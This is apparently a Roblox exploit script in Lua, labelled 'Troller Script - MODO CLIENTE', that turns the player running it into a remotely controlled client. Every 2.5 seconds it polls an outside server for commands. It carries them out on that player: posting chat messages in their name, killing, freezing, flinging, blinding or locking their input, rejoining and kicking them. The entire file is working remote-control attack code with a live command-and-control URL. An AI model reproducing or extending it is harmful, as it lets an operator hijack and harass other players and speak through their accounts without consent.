--[[
    Troller Script - MODO CLIENTE (Obediencia por Nube)
]]

if _G.__TrollerClientRunning then return end
_G.__TrollerClientRunning = true

local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local TextChatService   = game:GetService("TextChatService")
local Debris            = game:GetService("Debris")
local TeleportService   = game:GetService("TeleportService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui           = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local PREFIX = "."
local NO_TARGET = "@@NONE@@"
local SERVER_URL = "https://sbxx2o7cud.apps.bot-hosting.cloud"

local selfFrozen  = false
local selfBlinded = false
local selfBlocked = false
_G.TrollerSelfBlocked = false

local UNDO_REQUIRES_NICK = { unfr = true, unblind = true, unblock = true }
local TEXT_COMMANDS = { say = true }

local function getPlayersByName(name)
    local lower = name:lower()
    local exact, prefix = {}, {}
    for _, p in ipairs(Players:GetPlayers()) do
        local pn, dn = p.Name:lower(), p.DisplayName:lower()
        if pn == lower or dn == lower then
            table.insert(exact, p)
        elseif pn:sub(1, #lower) == lower or dn:sub(1, #lower) == lower then
            table.insert(prefix, p)
        end
    end
    if #exact > 0 then return exact end
    return prefix
end

local function splitArgs(msg)
    local args = {}
    for word in msg:gmatch("%S+") do table.insert(args, word) end
    return args
end

local function parseTargetForCmd(args, cmdName)
    if not args[2] then return nil, 2 end
    local second = args[2]
    if second:sub(-1) == "." and #second > 1 then
        local name = second:sub(1, -2)
        if #getPlayersByName(name) > 0 then return name, 3 end
        return NO_TARGET, 2
    end
    if TEXT_COMMANDS[cmdName] then return nil, 2 end
    if #getPlayersByName(second) > 0 then return second, 3 end
    return NO_TARGET, 2
end

local function getLocalHumanoid()
    local char = LocalPlayer.Character
    return char and char:FindFirstChildOfClass("Humanoid")
end

local function getLocalHRP()
    local char = LocalPlayer.Character
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function freezeSelf()
    selfFrozen = true
    local hum = getLocalHumanoid()
    if hum then hum.WalkSpeed = 0; hum.JumpPower = 0; hum.PlatformStand = true end
end

local function unfreezeSelf()
    selfFrozen = false
    local hum = getLocalHumanoid()
    if hum then hum.WalkSpeed = 16; hum.JumpPower = 50; hum.PlatformStand = false end
end

local function killSelf()
    local hum = getLocalHumanoid()
    if hum then hum.Health = 0 end
end

local function flingSelf()
    pcall(function()
        local remote = ReplicatedStorage:WaitForChild("Events"):WaitForChild("RagdollState")
        local args = { Vector3.new(541.3, 1002.5, -802.6), 5 }
        for i = 1, 2 do firesignal(remote.OnClientEvent, table.unpack(args)); task.wait(0.05) end
    end)
end

local function flingSelf2()
    local hrp = getLocalHRP()
    if not hrp then return end
    hrp.CFrame = hrp.CFrame + Vector3.new(0, 7.5, 0)
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(150, 225), math.random(-50, 50))
    bv.Parent = hrp; Debris:AddItem(bv, 0.125)
end

local function blindSelf()
    if selfBlinded then return end
    selfBlinded = true
    local guiParent = CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not guiParent then return end
    local gui = Instance.new("ScreenGui"); gui.Name = "TrollerBlind"; gui.IgnoreGuiInset = true; gui.ResetOnSpawn = false
    local frame = Instance.new("Frame"); frame.Size = UDim2.new(1, 0, 1, 0); frame.BackgroundColor3 = Color3.new(0, 0, 0); frame.Parent = gui
    gui.Parent = guiParent
    pcall(function() UserInputService.ModalEnabled = true end)
end

local function unblindSelf()
    selfBlinded = false
    pcall(function() UserInputService.ModalEnabled = false end)
    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChildOfClass("PlayerGui")}) do
        if parent then local g = parent:FindFirstChild("TrollerBlind") if g then g:Destroy() end end
    end
end

local function blockSelf()
    if selfBlocked then return end
    selfBlocked = true; _G.TrollerSelfBlocked = true
    local guiParent = CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not guiParent then return end
    local gui = Instance.new("ScreenGui"); gui.Name = "TrollerBlock"; gui.IgnoreGuiInset = true; gui.ResetOnSpawn = false
    local frame = Instance.new("Frame"); frame.Size = UDim2.new(1, 0, 1, 0); frame.BackgroundTransparency = 1; frame.Active = true; frame.Parent = gui
    gui.Parent = guiParent
    pcall(function() UserInputService.ModalEnabled = true end)
end

local function unblockSelf()
    selfBlocked = false; _G.TrollerSelfBlocked = false
    pcall(function() UserInputService.ModalEnabled = false end)
    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChildOfClass("PlayerGui")}) do
        if parent then local g = parent:FindFirstChild("TrollerBlock") if g then g:Destroy() end end
    end
end

local function rejoinSelf()
    pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId) end)
end

local function applyCommandLocally(cmdName, text)
    if cmdName == "say" then
        if text and text ~= "" then pcall(function() TextChatService.TextChannels.RBXGeneral:SendAsync(text) end) end
    elseif cmdName == "kill"    then killSelf()
    elseif cmdName == "fr"      then freezeSelf()
    elseif cmdName == "unfr"    then unfreezeSelf()
    elseif cmdName == "fling"   then flingSelf()
    elseif cmdName == "fling2"  then flingSelf2()
    elseif cmdName == "blind"   then blindSelf()
    elseif cmdName == "unblind" then unblindSelf()
    elseif cmdName == "block"   then blockSelf()
    elseif cmdName == "unblock" then unblockSelf()
    elseif cmdName == "rj"      then rejoinSelf()
    elseif cmdName == "kick"    then pcall(function() LocalPlayer:Kick("Expulsado") end)
    elseif cmdName == "ban"     then pcall(function() LocalPlayer:Kick("Baneado") end)
    end
end

local function processCloudCommand(message)
    if not message or message == "" then return end
    if message:sub(1, #PREFIX) ~= PREFIX then return end

    local body = message:sub(#PREFIX + 1)
    local args = splitArgs(body)
    if #args == 0 then return end

    local cmdName = args[1]:lower()
    local targetName, restStart = parseTargetForCmd(args, cmdName)

    if targetName == NO_TARGET then return end
    if UNDO_REQUIRES_NICK[cmdName] and not targetName then return end

    local text = ""
    if #args >= restStart then text = table.concat(args, " ", restStart) end

    local iAmTarget = false
    if not targetName then
        iAmTarget = true
    else
        for _, p in ipairs(getPlayersByName(targetName)) do
            if p == LocalPlayer then iAmTarget = true; break end
        end
    end
    if not iAmTarget then return end

    applyCommandLocally(cmdName, text)
end

local lastFetchedCommand = ""

task.spawn(function()
    while true do
        local success, response = pcall(function()
            return game:HttpGet(SERVER_URL .. "/api/get-command")
        end)

        if success then
            local suc, data = pcall(function() return HttpService:JSONDecode(response) end)
            if suc and data and data.command then
                if data.command ~= "" and data.command ~= lastFetchedCommand then
                    lastFetchedCommand = data.command
                    processCloudCommand(data.command)
                elseif data.command == "" then
                    lastFetchedCommand = ""
                end
            end
        end
        task.wait(2.5)
    end
end)

LocalPlayer.CharacterAdded:Connect(function()
    if selfFrozen then task.wait(0.25); freezeSelf() end
    if selfBlinded then task.wait(0.6); blindSelf() end
    if selfBlocked then task.wait(0.6); blockSelf() end
end)

print("[Troller] Cliente conectado a la nube.")
